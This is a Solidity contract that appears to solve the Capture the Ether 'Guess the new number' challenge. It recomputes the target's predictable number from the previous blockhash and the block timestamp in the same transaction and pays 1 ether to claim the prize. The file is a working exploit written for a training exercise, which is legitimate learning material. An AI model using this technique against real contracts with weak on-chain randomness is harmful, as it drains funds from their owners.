// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

import "../GuessTheNewNumberChallenge.sol";

contract GuessTheNewNumberProxy {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function guess(address deployedAt) external payable {
        require(msg.sender == owner, "Access denied");
        require(msg.value == 1 ether, "Guess costs 1 ether");

        GuessTheNewNumberChallenge challenge = GuessTheNewNumberChallenge(
            deployedAt
        );

        uint8 answer = uint8(
            keccak256(blockhash(block.number - 1), block.timestamp)
        );

        challenge.guess.value(1 ether)(answer);
    }

    function withdraw() public {
        require(msg.sender == owner, "Access Denied");
        owner.transfer(address(this).balance);
    }

    function() external payable {}
}
